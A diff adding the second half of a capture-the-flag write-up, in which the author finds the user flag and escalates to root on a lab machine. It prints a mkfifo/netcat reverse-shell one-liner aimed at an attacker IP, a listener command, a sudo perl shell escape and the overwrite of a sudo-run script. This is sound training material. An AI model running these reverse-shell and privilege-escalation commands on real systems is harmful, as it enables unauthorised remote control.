@@ -167,4 +167,48 @@ function printit ($string) {
 ```
 
 
-asdf
+We now have a low-priv shell on the system. Let's first grab the user flag and then work on escalating our privileges.
+
+`find / -type f -name user.txt 2>/dev/null`
+
+And we got a hit at `/home/itguy/user.txt`
+
+Let's work on the root flag now.
+
+`sudo -l` to check our current privileges.
+
+Looks like we can run perl, and a perl backup script as sudo. We'll check our trusty https://gtfobins.github.io/ for an exploit.
+
+`sudo perl -e 'exec "/bin/sh";'`
+
+We get the following error:
+
+> sudo: no tty present and no askpass program specified
+
+The other script "backup.pl" appears to use perl to execute a script located at "/etc/copy.sh"
+
+The script:
+
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f`
+
+This looks familiar...it appears to be a reverse shell conveniently waiting for us to modify it for our use case. We can't use `nano` so we'll use `echo` to modify it.
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.102.213 5554 >/tmp/f" > /etc/copy.sh
+
+Remember to set up the listener on our Attackbox
+
+`nc -lvnp 5554`
+
+Also, remember that we have sudo permission for /home/itguy/backup.pl which is the perl script which runs /copy.sh
+
+We need to run that script as sudo, otherwise we won't get the root shell, it'll just be a low-priv shell.
+
+`sudo perl /home/itguy/backup.pl`
+
+Now that we're root, let's find that flag.
+
+`find / -type f -name root.txt 2>/dev/null`
+
+Done!
+
+This box was a little more challenging than the others I've done so far. I had research how to get an initial foothold (through the mySQL backup file). I also didn't recognize the contents of `copy.sh` as a reverse shell at first so I got stuck on that part too. I definitely learned a lot though, and I'm looking forward to the next box!
